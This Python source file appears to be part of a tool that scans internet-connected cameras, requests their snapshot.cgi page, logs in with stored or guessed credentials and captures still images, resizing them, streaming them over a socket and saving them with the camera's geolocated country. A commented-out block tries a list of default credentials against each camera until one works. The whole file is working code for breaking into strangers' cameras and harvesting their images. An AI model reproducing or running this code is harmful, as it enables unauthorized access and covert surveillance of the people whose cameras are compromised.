#/bin/env python
import logging
import threading
import time
import Image
import StringIO
import GeoIP
import json
import base64
import pytz
import datetime
import pycountry
import random
from HTTPClient import HTTPClient
"""
RefreshClientThread Class
"""
class RefreshClientThread(threading.Thread):
    def __init__(self, db_helper, config):
        threading.Thread.__init__(self)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.db = db_helper
        self.http_client = HTTPClient(config)
        self.running = True
        self.paused = True
        self.socket = None

    def run(self):
        while self.running:
            if not self.paused:
                self.logger.info('Starting to request')
                #self.logger.debug('Random Host: ' + str(self.db.get_random_authed_host()))
                host_data = self.db.get_random_authed_host()
                # time from country -> only country, get code, tz (random if more than 1)
                if host_data[3] != 'Unknown':
                    rtime = self.time_from_country(host_data[3])
                    # is it night?
                    if rtime is not None and rtime > 2000 and rtime < 1000:
                        self.logger.debug('Maybe it is night in %s, time: %s' % (host_data[3], str(rtime)))
                        break
                    self.logger.debug('Time in %s is: %s' % (host_data[3], str(rtime)))

                self.logger.info('Checking Host: %s in Country: %s' % (host_data[0], host_data[3]))
                self.http_client.set_auth(None)
                self.http_client.set_ua(self.db.get_random_ua())
                self.http_client.set_url('http://' + host_data[0] + '/')
                res = self.http_client.openurl()
                if self.http_client.get_r_code() == 200 and res.read() == 'OFFLINE':
                    self.logger.debug('Host %s is offline' % host_data[0])
                elif self.http_client.get_r_code() == 503:
                    self.logger.debug('Host %s is not reachable' % host_data[0])
                else:
                    self.http_client.append_url('snapshot.cgi')
                    res = self.http_client.openurl()
                    if self.http_client.get_r_code() == 401:
                        self.http_client.set_auth((host_data[1], host_data[2]))
                        res = self.http_client.openurl()
                        if self.http_client.get_r_code() == 200:
                            try:
                                img = Image.open(StringIO.StringIO(res.read()))
                                if img.size != (160, 120):
                                    self.logger.debug('Image size is %s resizing' % str(img.size))
                                    img = img.resize((160, 120), Image.ANTIALIAS)
                                img_out = StringIO.StringIO()
                                img.save(img_out, 'JPEG')
                                image = img_out.getvalue()
                                # send to socket
                                self.socket.send(json.dumps({'image': base64.b64encode(image)}))
                                # update db
                                self.db.save_image(host_data[0], host_data[1], host_data[2], image, self.get_country(self.http_client.get_ip()))
                            except IOError as e:
                                self.logger.warn('Failed to open image: %s' % e)
                    elif self.http_client.get_r_code() == 404:
                        self.logger.debug('snapshot.cgi not found')
                    else:
                         self.logger.error('Unknown status: %s on %s' % (str(self.http_client.get_r_code()), self.http_client.get_url()))



            else:
                # wait for it ...
                time.sleep(1)
        self.logger.info('Exiting Thread')

    def get_country(self, ip):
        if ip is not None:
            gi = GeoIP.new(GeoIP.GEOIP_MEMORY_CACHE)
            c = gi.country_name_by_addr(ip)
            self.logger.debug('Country: %s' % c)
            return c
        return 'Unknown'

    def time_from_country(self, country):
        try:
            c_alpha2    = pycountry.countries.get(name=country).alpha2
            tz_str      = random.choice(pytz.country_timezones(c_alpha2))
            tz          = pytz.timezone(tz_str)
            dt          = datetime.datetime.now(tz)
            return int(dt.strftime('%H%M'))
        except KeyError as e:
            self.logger.error('Country %s unknown?' % country)
        return None

    def stop(self):
        self.running = False

    def check(self, socket):
        self.socket = socket
        self.paused = False

    def pause(self):
        self.paused = True

"""
    def run(self):
        self.logger.info('Checking Host: %s' % self.host)
        self.http_client.set_url('http://' + self.host + '/')
        res = self.http_client.openurl()
        if self.http_client.get_r_code() == 200 and res.read() == 'OFFLINE':
            self.logger.debug('Host %s is offline' % self.host)
            self.status = 'offline'
        elif self.http_client.get_r_code() == 503:
            self.logger.debug('Host %s is not reachable' % self.host)
            self.status = 'timeout'
        else:
            self.http_client.append_url('snapshot.cgi')
            res = self.http_client.openurl()
            if self.http_client.get_r_code() == 401:
                self.status = 'unauthorized'
                self.logger.debug('Try to authenticate')
                for c in self.db.get_credentials():
                    self.http_client.set_auth((c[0], c[2]))
                    res = self.http_client.openurl()
                    if self.http_client.get_r_code() == 200:
                        self.logger.info('Login successfully')
                        self.status = 'authorized'
                        try:
                            img = Image.open(StringIO.StringIO(res.read()))
                            if img.size != (160, 120):
                                self.logger.debug('Image size is %s resizing' % str(img.size))
                                img = img.resize((160, 120), Image.ANTIALIAS)
                            img_out = StringIO.StringIO()
                            img.save(img_out, 'JPEG')
                            self.logger.info('Got an image')
                            self.auth_data = (c[0], c[2])
                            self.image = img_out.getvalue()
                            #self.db.update_online_authed(self.host, c[0], pgdb.escape_bytea(img_out.getvalue()))
                            break
                        except IOError as e:
                            self.logger.warn('Failed to open image: %s' % e)
                            break
                    elif self.http_client.get_r_code() == 404:
                        self.logger.error('THIS SHOULD NOT HAPPEN!')
                        self.logger.debug('Login successfully? snapshot.cgi not found?')
                        self.status = 'not_found'
                    elif self.http_client.get_r_code() == 401:
                        pass
                    else:
                        self.logger.error('Auth: unknown status: %i' % self.http_client.get_r_code())
                        if res is not None:
                            self.logger.error('Header:\n%s' % res.info())
                        self.status = 'unexcepted'
            elif self.http_client.get_r_code() == 404:
                self.logger.debug('snapshot.cgi not found')
                self.status = 'not_found'
            else:
                self.logger.error('Unknown status: %s on %s' % (str(self.http_client.get_r_code()), self.http_client.get_url()))
                if res is not None:
                    self.logger.error('Header:\n%s' % res.info())
                self.status = 'unexcepted'
        
        self.logger.info('Finished Host: %s' % self.host)
        return {
                'status': self.status, 
                'auth_data': self.auth_data,
                'image': self.image,
                'country': self.get_country(self.http_client.get_ip())}

    def get_country(self, ip):
        if ip is not None:
            gi = GeoIP.new(GeoIP.GEOIP_MEMORY_CACHE)
            c = gi.country_name_by_addr(ip)
            self.logger.debug('Country: %s' % c)
            return c
        return 'Unknown'
"""



# vim: tabstop=8 expandtab shiftwidth=4 softtabstop=4
